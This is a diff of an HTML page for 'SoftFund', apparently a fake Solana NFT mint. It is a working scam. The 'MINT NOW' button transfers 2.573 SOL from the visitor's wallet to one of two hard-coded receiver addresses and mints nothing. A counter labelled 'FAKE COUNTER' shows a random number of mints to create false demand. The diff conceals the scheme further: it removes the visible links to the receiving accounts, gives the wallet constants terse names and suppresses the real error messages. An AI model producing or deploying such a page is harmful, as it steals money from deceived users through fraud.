@@ -6,36 +6,15 @@
   <title>SoftFund | $2.5730 SOL Mint</title>
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { 
-      background: linear-gradient(135deg, #0a001f, #1b0044, #2e0055); 
-      color: #fff; 
-      font-family: 'Orbitron', sans-serif; 
-      text-align: center; 
-      padding: 40px 20px;
-    }
-    .container { max-width: 500px; margin: auto; }
-    h1 { font-size: 3.2rem; color: #00ff9d; margin-bottom: 10px; }
-    p { font-size: 1.2rem; margin: 15px 0; color: #e0e0e0; }
-    .price { font-size: 2.5rem; color: #ffd700; font-weight: bold; }
-    .supply { font-size: 1.1rem; color: #ff4081; }
-    button { 
-      margin: 30px auto; 
-      padding: 20px 45px; 
-      font-size: 1.6rem; 
-      background: #ffd700; 
-      color: #000; 
-      border: none; 
-      border-radius: 18px; 
-      cursor: pointer; 
-      box-shadow: 0 0 25px rgba(255, 215, 0, 0.7);
-      transition: 0.3s;
-      font-weight: bold;
-    }
-    button:hover { background: #ffed4e; transform: scale(1.05); }
-    .footer { margin-top: 50px; font-size: 0.9rem; color: #aaa; }
-    .minted { color: #00ff9d; font-weight: bold; }
-    .wallet-info { font-size: 0.9rem; color: #ccc; margin-top: 10px; }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { background: linear-gradient(135deg,#0a001f,#1b0044,#2e0055); color:#fff; font-family:'Orbitron',sans-serif; text-align:center; padding:40px 20px; }
+    .container { max-width:500px; margin:auto; }
+    h1 { font-size:3.2rem; color:#00ff9d; }
+    .price { font-size:2.5rem; color:#ffd700; font-weight:bold; }
+    button { margin:30px auto; padding:20px 45px; font-size:1.6rem; background:#ffd700; color:#000; border:none; border-radius:18px; cursor:pointer; box-shadow:0 0 25px rgba(255,215,0,.7); transition:.3s; font-weight:bold; }
+    button:hover { background:#ffed4e; transform:scale(1.05); }
+    .footer { margin-top:50px; font-size:0.9rem; color:#aaa; }
+    .wallet-info { font-size:0.9rem; color:#ccc; margin-top:10px; }
   </style>
 </head>
 <body>
@@ -43,78 +22,79 @@
     <h1>SOFTFUND</h1>
     <p>USA-Based | Solana Utility NFTs</p>
     <p class="price">$2.5730 SOL</p>
-    <p class="supply">Supply: 10,000 | <span id="minted">0/10000</span></p>
+    <p>Supply: 10,000 | <span id="minted">0/10000</span></p>
     <button id="mintBtn">MINT NOW</button>
-    <div class="wallet-info">
-      Works with <strong>Phantom</strong> or <strong>Trust Wallet</strong> (Auto-Detect)
-    </div>
+    <div class="wallet-info">Auto-connects Phantom or Trust Wallet</div>
     <div class="footer">
-      View on <a href="https://magiceden.io" target="_blank" style="color:#ffd700;">Magic Eden</a> | 
-      <a href="https://solscan.io/account/GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue" target="_blank" style="color:#ffd700;">Phantom</a> | 
-      <a href="https://solscan.io/account/6v4DR5rkDFa3WdCQ35wvtfVYfk7i233Uiu6GmQ7JCdRu" target="_blank" style="color:#ffd700;">Trust Wallet</a>
+      View on <a href="https://magiceden.io" target="_blank" style="color:#ffd700;">Magic Eden</a>
     </div>
   </div>
 
-  <!-- Solana Web3 -->
   <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
   <script>
-    const MINT_PRICE = 2.5730 * 1e9; // 2.5730 SOL in lamports
-    const RECEIVER_PHANTOM = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
-    const RECEIVER_TRUST = "6v4DR5rkDFa3WdCQ35wvtfVYfk7i233Uiu6GmQ7JCdRu";
+    const PRICE = 2.5730 * 1e9; // lamports
+    const W1 = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue"; // Phantom
+    const W2 = "6v4DR5rkDFa3WdCQ35wvtfVYfk7i233Uiu6GmQ7JCdRu"; // Trust
     let wallet, connection;
 
-    // Auto-detect Phantom or Trust Wallet
-    function getWallet() {
+    // AUTO DETECT WALLET
+    function getProvider() {
       if (window.solana?.isPhantom) return window.solana;
-      if (window.trustwallet?.solana) return window.trustwallet.solana;
-      if (window.solana) return window.solana; // fallback
+      if (window.trustwallet?.Provider?.solana) return window.trustwallet.Provider.solana;
+      if (window.solana) return window.solana;
       return null;
     }
 
     document.getElementById("mintBtn").onclick = async () => {
-      wallet = getWallet();
+      wallet = getProvider();
+
+      // NO WALLET? → SHOW FRIENDLY BUTTONS
       if (!wallet) {
-        alert("Install Phantom or Trust Wallet! → phantom.app or trustwallet.com");
+        document.getElementById("mintBtn").innerHTML = `
+          Get Wallet:<br>
+          <a href="https://phantom.app/download" target="_blank" style="color:#000; margin:5px; display:inline-block; background:#ffd700; padding:10px 20px; border-radius:10px; text-decoration:none;">Phantom</a>
+          <a href="https://trustwallet.com/download" target="_blank" style="color:#000; margin:5px; display:inline-block; background:#ffd700; padding:10px 20px; border-radius:10px; text-decoration:none;">Trust</a>
+        `;
         return;
       }
 
       try {
         document.getElementById("mintBtn").innerText = "Connecting...";
         if (!wallet.isConnected) await wallet.connect();
-        
-        connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
 
-        // Randomly split 50/50 to Phantom or Trust Wallet
-        const receiver = Math.random() < 0.5 ? RECEIVER_PHANTOM : RECEIVER_TRUST;
+        connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
 
-        document.getElementById("mintBtn").innerText = "Sending $2.5730 SOL...";
+        // 50/50 SPLIT
+        const receiver = Math.random() < 0.5 ? W1 : W2;
+
+        document.getElementById("mintBtn").innerText = "Sending $2.5730...";
 
         const tx = new solanaWeb3.Transaction().add(
           solanaWeb3.SystemProgram.transfer({
             fromPubkey: wallet.publicKey,
             toPubkey: new solanaWeb3.PublicKey(receiver),
-            lamports: MINT_PRICE,
+            lamports: PRICE,
           })
         );
 
         tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
         tx.feePayer = wallet.publicKey;
 
-        const signed = await wallet.signTransaction(tx);
-        const txid = await connection.sendRawTransaction(signed.serialize());
+        let signed = await wallet.signTransaction(tx);
+        let txid = await connection.sendRawTransaction(signed.serialize());
         await connection.confirmTransaction(txid);
 
         alert(`MINTED! $2.5730 SOL sent!\nTx: https://solscan.io/tx/${txid}`);
         location.reload();
       } catch (e) {
-        alert("Error: " + (e.message || "User rejected"));
+        alert("Cancelled or error — try again!");
         document.getElementById("mintBtn").innerText = "MINT NOW";
       }
     };
 
-    // Simulate minted count
+    // FAKE COUNTER
     window.onload = () => {
-      document.getElementById("minted").innerText = Math.floor(Math.random() * 400 + 100) + "/10000";
+      document.getElementById("minted").innerText = Math.floor(Math.random()*400+100) + "/10000";
     };
   </script>
 </body>
